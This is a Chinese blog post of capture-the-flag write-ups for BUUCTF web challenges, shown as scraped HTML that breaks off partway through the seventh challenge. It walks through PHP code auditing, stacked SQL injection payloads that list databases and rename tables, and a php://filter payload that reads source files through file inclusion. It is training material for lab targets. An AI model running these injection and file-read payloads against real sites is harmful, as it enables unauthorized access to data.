{"blogid": "119641325", "writerAge": "码龄2年", "writerBlogNum": "76", "writerCollect": "349", "writerComment": "19", "writerFan": "103", "writerGrade": "4级", "writerIntegral": "1057", "writerName": "吃_早餐", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_119641325.jpg", "writerRankTotal": "17670", "writerRankWeekly": "13298", "writerThumb": "100", "writerVisitNum": "73848", "blog_read_count": "7831", "blog_time": "于 2021-08-12 12:21:17 发布", "blog_title": "【CTF】buuctf web 详解（持续更新）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night-eighties\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>buuctf web</h3>\n<ul><li><a href=\"#HCTF_2018WarmUp_2\">[HCTF 2018]WarmUp</a></li><li><a href=\"#_2019EasySQL_76\">[极客大挑战 2019]EasySQL</a></li><li><a href=\"#_2019Havefun_80\">[极客大挑战 2019]Havefun</a></li><li><a href=\"#_2019_102\">[强网杯 2019]随便注</a></li><li><a href=\"#ACTF2020_Include_136\">[ACTF2020 新生赛]Include</a></li><li><a href=\"#SUCTF_2019EasySQL_193\">[SUCTF 2019]EasySQL</a></li><li><a href=\"#_2019Secret_File_212\">[极客大挑战 2019]Secret File</a></li><li><a href=\"#ACTF2020_Exec_292\">[ACTF2020 新生赛]Exec</a></li><li><a href=\"#_2019LoveSQL_312\">[极客大挑战 2019]LoveSQL</a></li><li><a href=\"#GXYCTF2019Ping_Ping_Ping_341\">[GXYCTF2019]Ping Ping Ping</a></li><li><a href=\"#_2019Knife_438\">[极客大挑战 2019]Knife</a></li><li><a href=\"#_2019Http_455\">[极客大挑战 2019]Http</a></li><li><a href=\"#RoarCTF_2019Easy_Calc_474\">[RoarCTF 2019]Easy Calc</a></li><li><a href=\"#_2019Upload_512\">[极客大挑战 2019]Upload</a></li><li><a href=\"#_2019PHP_538\">[极客大挑战 2019]PHP</a></li><li><a href=\"#_2018easy_tornado_665\">[护网杯 2018]easy_tornado</a></li><li><a href=\"#ACTF2020_Upload_711\">[ACTF2020 新生赛]Upload</a></li><li><a href=\"#_2019BabySQL_729\">[极客大挑战 2019]BabySQL</a></li><li><a href=\"#ACTF2020_BackupFile_761\">[ACTF2020 新生赛]BackupFile</a></li><li><a href=\"#HCTF_2018admin_807\">[HCTF 2018]admin</a></li><li><a href=\"#_2019BuyFlag_964\">[极客大挑战 2019]BuyFlag</a></li><li><a href=\"#BJDCTF2020Easy_MD5_988\">[BJDCTF2020]Easy MD5</a></li><li><a href=\"#ZJCTF_2019NiZhuanSiWei_1018\">[ZJCTF 2019]NiZhuanSiWei</a></li><li><a href=\"#SUCTF_2019CheckIn_1069\">[SUCTF 2019]CheckIn</a></li><li><a href=\"#_2019HardSQL_1098\">[极客大挑战 2019]HardSQL</a></li><li><a href=\"#_2020_AreUSerialz_1116\">[网鼎杯 2020 青龙组]AreUSerialz</a></li><li><a href=\"#MRCTF2020_1223\">[MRCTF2020]你传你🐎呢</a></li><li><a href=\"#MRCTF2020Ez_bypass_1267\">[MRCTF2020]Ez_bypass</a></li><li><a href=\"#GXYCTF2019BabySQli_1335\">[GXYCTF2019]BabySQli</a></li><li><a href=\"#CISCN2019__Day2_Web1Hack_World_1429\">[CISCN2019 华北赛区 Day2 Web1]Hack World</a></li><li><a href=\"#GYCTF2020Blacklist_1465\">[GYCTF2020]Blacklist</a></li><li><a href=\"#_2018Fakebook_1483\">[网鼎杯 2018]Fakebook</a></li><li><a href=\"#GXYCTF2019BabyUpload_1576\">[GXYCTF2019]BabyUpload</a></li><li><a href=\"#BUUCTF_2018Online_Tool_1640\">[BUUCTF 2018]Online Tool</a></li><li><a href=\"#RoarCTF_2019Easy_Java_1709\">[RoarCTF 2019]Easy Java</a></li><li><a href=\"#GXYCTF2019_1717\">[GXYCTF2019]禁止套娃</a></li><li><a href=\"#GWCTF_2019_1725\">[GWCTF 2019]我有一个数据库</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"HCTF_2018WarmUp_2\"></a>[HCTF 2018]WarmUp</h1>\n<p><strong>题目类型：PHP代码审计</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210717224401610.png\"/><br/> 查看源码，发现有一个source.php文件<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210717224500633.png\"/><br/> 查看此文件，出现一堆PHP代码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210717225603522.png\"/><br/> 发现里面有一个hint.php文件，查看一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210717225757751.png\"/><br/> 文件里说明flag在ffffllllaaaagggg里<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2021071723062834.png\"/></p>\n<ul><li><strong>代码审计</strong><br/> <mark>is_string()</mark>：检测变量是否是字符串<br/> <mark>isset()</mark>：检测变量是否已设置并且非 NULL<br/> <mark>in_array(要搜索的值，要搜索的数组)</mark>：搜索数组中是否存在指定的值<br/> <mark>mb_substr($page，n，m)</mark>：返回page中从第n位开始，到n+m位字符串的值<br/> <mark>mb_strpos()</mark>：查找字符串在另一个字符串中首次出现的位置<br/> <mark>urldecode()</mark>：将url编码后的字符串还原成未编码的样子</li></ul>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">emmm</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//如果page的值为空或者不是字符串</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">//检测page的值是否在白名单中</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//查找字符串在另一个字符串中首次出现的位置</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//检验page的值是否在白名单内</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">//将url编码后的字符串还原成未编码的样子，然后赋值给page</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//查找字符串在另一个字符串中首次出现的位置</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//检验page的值是否在白名单内</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\t\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>  \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> \n</code></pre>\n<h1><a id=\"_2019EasySQL_76\"></a>[极客大挑战 2019]EasySQL</h1>\n<p><strong>题目类型：简单的SQL注入</strong><br/> 直接万能密码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718102744574.png\"/></p>\n<h1><a id=\"_2019Havefun_80\"></a>[极客大挑战 2019]Havefun</h1>\n<p><strong>题目类型：代码审计</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718104856271.png\"/>查看源代码</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n        <span class=\"token variable\">$cat</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cat'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$cat</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cat</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'dog'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Syc{cat_cat_cat_cat}'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"position: absolute;bottom: 0;width: 99%;\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>p align<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"center\"</span> style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"font:italic 15px Georgia,serif;color:black;\"</span><span class=\"token operator\">&gt;</span> Syclover @ cl4y<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>p<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><strong>代码审计</strong><br/> 有一个cat变量，通过get方式传参，如果cat=dog输出flag<br/> 使用构造payload：<code>/?cat=dog</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718104746485.png\"/></p>\n<h1><a id=\"_2019_102\"></a>[强网杯 2019]随便注</h1>\n<p>题目类型：SQL注入<br/> 本题要有SQL语法基础：<a href=\"https://blog.csdn.net/m0_52923241/article/details/115219914?spm=1001.2014.3001.5501\">SQL通用语法</a><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718105320474.png\"/><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718111624835.png\"/><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718111814138.png\"/><br/> 查询3时报错，说明有两个字段</p>\n<p>然后想尝试联合查询<br/> 结果报错<code>return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);</code><br/> 发现过滤了<code>select|update|delete|drop|insert|where|\\./i</code><br/> 爆数据库：<code>1';show databases;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718182444510.png\"/><br/> 爆表名：<code>1'; show tables;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\202107181826372.png\"/><br/> 出来两个表<br/> <code>1'; show columns from words;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718184651257.png\"/></p>\n<p><code>1'; show columns from '1919810931114514';#</code><br/> 注意：表名为数字时，要用反引号包起来查询。<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210718183124849.png\"/><br/> 发现1919810931114514表中有flag</p>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/103239145\">接下来的参考大佬们的方法</a><br/> 大佬文章里总结了三种方法，第一种比较好理解，其他两种怪我太菜看不太明白</p>\n<blockquote>\n<ul><li>通过 rename 先把 words 表改名为其他的表名。</li><li>把 1919810931114514 表的名字改为 words 。</li><li>给新 words 表添加新的列名 id 。</li><li>将 flag 改名为 data 。<br/> <code>1'; rename table words to word1; rename table '1919810931114514' to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</code></li></ul>\n</blockquote>\n<h1><a id=\"ACTF2020_Include_136\"></a>[ACTF2020 新生赛]Include</h1>\n<p><strong>题目类型：文件包含、PHP封装协议</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210719184041836.png\"/><br/> 点击链接</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20210719184111485.png\"/><br/> 出现了flag.php文件，?file=flag.php 猜测文件包含漏洞，此时就要想办法查看这个文件,那怎样来查看呢，下面是我学到的一个方法</p>\n<blockquote>\n<p><strong>重要的知识点——PHP封装协议：</strong><br/> <code>php://filter/read=convert.base64-encode/resource=xxx.php</code><br/> <strong>php://filter</strong> 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行<strong>任意文件的读取</strong>；根据名字filter，可以很容易想到这个协议可以用来过滤一些东西； 使用不同的参数可以达到不同的目的和效果：<br/> <code>resource=&lt;要过滤的数据流&gt;</code> 指定了你要筛选过滤的数据流。 必选<br/> <code>read=&lt;读链的筛选列表&gt;</code>可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br/> <code>write=&lt;写链的筛选列表&gt;</code> 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br/> <code>&lt;；两个链的筛选列表&gt;</code> 任何没有以 read= 或write=作前缀 的筛选器列表会视情况应用于读或写链。<br/> <strong>php://filter</strong>与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。<br/> <strong>read=convert.base64-encode</strong>，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p>\n</blockquote>\n<ul><li> <p>php://filter协议，用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p> </li><li> <p>payload: <code>/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p> </li><li> <p>得到base64编码后的内容为：<br/> PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7Y2U4MzdmMmYtYjI2Mi00ZDYxLWEzOWQtOTE4OWIwYmM0ODZkfQo=</p> </li><li> <p>接着base64解码：</p> <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Can you find out the flag?\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//flag{ce837f2f-b262-4d61-a39d-9189b0bc486d}</span>\n\n</code></pre> </li><li> <p>得到flag~~</p> </li></ul>\n<p>我们再以这种方法查看一下index.php文件</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf8\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">// 关闭错误报告</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//以get方式传参</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//stristr() 函数搜索字符串在另一字符串中的第一次出现,并返回字符串的剩余部分。</span>\n<span class=\"token comment\">//一下if语句过滤了\"php://input\" 、 \"zip://\" 、 \"phar://\" 、 \"data:\"</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"zip://\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"phar://\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"data:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;a href=\"?file=flag.php\"&gt;tips&lt;/a&gt;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<h1><a id=\"SUCTF_2019EasySQL_193\"></a>[SUCTF 2019]EasySQL</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\183c8ab029cf41f3aacb0e81e0dde37b.png\"/><br/> 先判断一下是数字型还是字符型，输入1<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e9b6f1d8999e4c0e9848f624c6fd1df3.png\"/><br/> OK，有回显；然后各种试试试，都是nonono</p>\n<p>还好，试了一下堆叠注入<br/> 爆出数据库：<code>1;show databases;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\354e161c61af4ad1aff231a70ab2818a.png\"/>爆表：<code>1;show tables;#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ef1f079e0bd54fd8a11e77ddcd80206e.png\"/>然后爆字段：<code>1;show columns from FLAG;#</code>，输入后回显<code>Nonono.</code>,猜测有被过滤<br/> 总之试了好多，搞得我又双叒叕不会了，唉···</p>\n<p>下面是学习众多大佬的方法<br/> 不知道大佬们怎么猜测出查询语句为：<code>select \".$post['query'].\"||flag from Flag</code><br/> 由于本题没有过滤<code>*</code>，用<code>*</code>查询flag中的所有字段，所以直接构造payload为：<code>*,1</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3ccde604e3c741a7b24d62655e62e164.png\"/><br/> 就是这么神奇</p>\n<h1><a id=\"_2019Secret_File_212\"></a>[极客大挑战 2019]Secret File</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\515a739542784953b80df68919a4cbb4.png\"/><br/> 查看源码</p>\n<pre><code class=\"prism language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">&gt;</span></span><span class=\"token style\"><span class=\"token language-css\">\n<span class=\"token selector\">#master</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span>absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>44%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span>0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-align</span> <span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token selector\">p,h1</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token property\">cursor</span><span class=\"token punctuation\">:</span> default<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">&gt;</span></span>\n\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>蒋璐源的秘密<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>black<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token style-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token style language-css\"><span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>verdana<span class=\"token punctuation\">;</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span><span class=\"token property\">text-align</span><span class=\"token 